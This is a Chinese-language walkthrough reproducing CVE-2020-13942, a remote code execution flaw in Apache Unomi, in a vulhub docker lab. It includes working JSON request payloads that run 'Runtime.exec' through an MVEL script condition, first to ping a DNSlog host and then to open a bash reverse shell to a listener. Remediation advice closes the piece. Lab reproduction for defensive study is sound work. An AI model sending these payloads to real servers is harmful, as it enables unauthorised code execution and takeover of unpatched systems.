## **0x00简介**

Apache Unomi 是一个基于标准的客户/数据平台（CDP，Customer Data
Platform），用于管理在线客户和访客等信息，以提供符合访客隐私规则的个性化体验，比如 GDPR 和“不跟踪”偏好设置。其最初于 Jahia
开发，2015 年 10 月提交给了 Apache 孵化器。

Apache Unomi 具有隐私管理、用户/事件/目标跟踪、报告、访客资料管理、细分、角色、A/B 测试等功能，它可以作为：

Ø Web CMS 个性化服务

Ø 原生移动应用的分析服务

Ø 具有分段功能的集中配置文件管理系统

Ø 授权管理中心

##  **0x01漏洞概述**

在Apache Unomi
1.5.1版本之前，攻击者可以通过精心构造的MVEL或ONGl表达式来发送恶意请求，使得Unomi服务器执行任意代码，漏洞对应编号为CVE-2020-11975，而CVE-2020-13942漏洞是对CVE-2020-11975漏洞的补丁绕过，攻击者绕过补丁检测的黑名单，发送恶意请求，在服务器执行任意代码。

##  **0x02影响版本**

Apache Unomi < 1.5.2

##  **0x03环境搭建**

1、本次环境搭建使用vulhub中的docker环境搭建，下载地址

https://github.com/vulhub/vulhub

2、然后使用vulhub中unomi目录下CVE-2020-13942漏洞为本次漏洞复现环境

cd vulhub/unomi/CVE-2020-13942/

![1615452856_6049dab8ef85fdad7506c.png!small?1615452858240](https://image.3001.net/images/20210311/1615452856_6049dab8ef85fdad7506c.png!small?1615452858240)

3、使用以下命令启动漏洞环境

docker-compose up -d

![1615452861_6049dabd1a6bc38a6c140.png!small?1615452862562](https://image.3001.net/images/20210311/1615452861_6049dabd1a6bc38a6c140.png!small?1615452862562)

4、看到下方显示绿色字体的done表明启动成功，在浏览器访问http://your-ip:8181出现以下界面表示成功

![1615452867_6049dac33a183fc667a61.png!small?1615452868580](https://image.3001.net/images/20210311/1615452867_6049dac33a183fc667a61.png!small?1615452868580)

##  **0x04漏洞复现**

1、 打开靶场首页，使用burp进行抓包，发送到Repeater模块构造数据包

![1615452871_6049dac73a83f1b7af4a7.png!small?1615452872608](https://image.3001.net/images/20210311/1615452871_6049dac73a83f1b7af4a7.png!small?1615452872608)

2、将GET包改为POST，删除多余的字段，保留Host、User-Agent和Content-Length字段，然后添加以下数据，在dnslog添加成自己的地址，然后发送

    
    
    {
    
    "filters": [
    
    {
    
    "id": "boom",
    
    "filters": [
    
    {
    
    "condition": {
    
    "parameterValues": {
    
    "": "script::Runtime r = Runtime.getRuntime(); r.exec('ping DNSlog');"
    
    },
    
    "type": "profilePropertyCondition"
    
    }
    
    }
    
    ]
    
    }
    
    ],
    
    "sessionId": "boom"
    
    }

![1615452878_6049dace8b038e463667e.png!small?1615452880259](https://image.3001.net/images/20210311/1615452878_6049dace8b038e463667e.png!small?1615452880259)

![1615452883_6049dad32395548eb4d9e.png!small?1615452884553](https://image.3001.net/images/20210311/1615452883_6049dad32395548eb4d9e.png!small?1615452884553)

![1615452887_6049dad773035056e22f7.png!small?1615452888924](https://image.3001.net/images/20210311/1615452887_6049dad773035056e22f7.png!small?1615452888924)

3、在dnslog网站上刷新查看是否有数据，可以看到有数据

![1615452891_6049dadbadd16009a212d.png!small?1615452893005](https://image.3001.net/images/20210311/1615452891_6049dadbadd16009a212d.png!small?1615452893005)

4、利用此漏洞反弹shell，将bash反弹shell的命令进行编码，编码网址为：http://www.jackson-t.ca/runtime-exec-payloads.html

![1615452895_6049dadfb23267b5ce03e.png!small?1615452896986](https://image.3001.net/images/20210311/1615452895_6049dadfb23267b5ce03e.png!small?1615452896986)

5、将编码后的shell添加到以下代码中的shell编码处，kali设置监听，然后发送。

    
    
    {
    
    "filters": [
    
    {
    
    "id": "boom",
    
    "filters": [
    
    {
    
    "condition": {
    
    "parameterValues": {
    
    "": "script::Runtime r = Runtime.getRuntime(); r.exec(\"shell编码\");"
    
    },
    
    "type": "profilePropertyCondition"
    
    }
    
    }
    
    ]
    
    }
    
    ],
    
    "sessionId": "boom"
    
    }

![1615452901_6049dae5bb9cd97df36c0.png!small?1615452903326](https://image.3001.net/images/20210311/1615452901_6049dae5bb9cd97df36c0.png!small?1615452903326)

6、在kali上查看shell成功返回。

![1615452906_6049daeae539b41735945.png!small?1615452908211](https://image.3001.net/images/20210311/1615452906_6049daeae539b41735945.png!small?1615452908211)

##  **0x05修复建议**

1、尽可能避免将用户数据放入表达式解释器中。

2、目前厂商已发布最新版本，请受影响用户及时下载并更新至最新版本。官方链接如下：https://unomi.apache.org/download.html

